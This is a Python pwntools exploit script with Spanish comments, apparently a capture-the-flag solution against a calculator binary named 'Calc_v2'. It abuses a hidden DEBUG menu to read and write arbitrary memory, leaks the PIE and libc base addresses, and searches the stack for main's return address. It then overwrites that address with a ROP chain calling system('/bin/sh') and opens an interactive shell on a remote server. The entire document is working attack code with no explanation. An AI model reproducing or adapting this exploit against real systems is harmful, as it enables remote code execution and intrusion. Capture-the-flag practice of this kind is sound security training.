from pwn import *

vuln = ELF("./Calc_v2") # Para usar en local debe ser el binario parchado con el libc
libc = ELF("./libc.so.6")
context.binary = vuln
context.terminal = "zellijc"
ayuda_debug_v = vuln.symbols["_ZN7Calc_v211ayuda_debug17h0c329d3d1c8cf8ceE"]
pop_rdi = 0x0000000000006e64
sol_ret = 0x00000000001bc02d

for symbol in vuln.symbols:
    if "main" in symbol:
        print(symbol)

def debug_menu(p):
    p.sendlineafter(b"(+, -, x, /, =) :", b"DEBUG")

def leer_u64(p, addr):
    debug_menu(p)
    p.sendline(b"23")
    p.sendline(str(addr).encode())
    return int(p.recvline())

def escribir_u64(p, addr, val):
    debug_menu(p)
    p.sendline(b"624")
    p.sendline(str(addr).encode())
    p.sendline(str(val).encode())

def ayuda_debug(p):
    debug_menu(p)
    p.sendline(b"8271")
    p.recvuntil(b"0x")
    return int(p.recvline(), 16)

# p = process(vuln.path)
# gdb.attach(p)
# p = remote("172.17.0.2", 3003)
p = remote("35.164.82.53", 3006)

leak = ayuda_debug(p)
vuln.address = leak - ayuda_debug_v

lecturas = vuln.symbols["_ZN7Calc_v28LECTURAS17hec01ee7f9f05b361E"]

log.warn("leak     {}".format(hex(leak)))
log.warn("lecturas {}".format(hex(lecturas)))
log.warn("lect mod {}".format((lecturas) % 8))
log.warn("bss      {}".format(hex(vuln.bss())))
log.warn("main     {}".format(hex(vuln.symbols["main"])))


read_addr = leer_u64(p, vuln.got["read"])
escribir_u64(p, lecturas-4, 0)

libc.address = read_addr - libc.symbols["read"]
syst_addr = libc.symbols["system"]
main_ret = vuln.symbols["main"] + 21

log.warn("system   {}".format(hex(syst_addr)))
log.warn("lcmain   {}".format(hex(main_ret)))

cursor = vuln.bss(0x00e0)

cursor = leer_u64(p, cursor)
escribir_u64(p, lecturas-4, 0)

log.warn("stack    {}".format(hex(cursor)))
log.warn("search   {}".format(hex(main_ret)))

log.warn("Searching...")

while True:
    data = leer_u64(p, cursor)
    escribir_u64(p, lecturas-4, 0)

    if data == main_ret:
        break
    cursor -= 8

log.warn("found    {}".format(hex(cursor)))

print(hex(pop_rdi + vuln.address))

escribir_u64(p, cursor, pop_rdi + vuln.address)
escribir_u64(p, cursor+8, next(libc.search(b'/bin/sh')))
escribir_u64(p, cursor+16, sol_ret + libc.address)
escribir_u64(p, cursor+24, libc.symbols["system"])
    
p.sendline(b"=")

p.interactive()
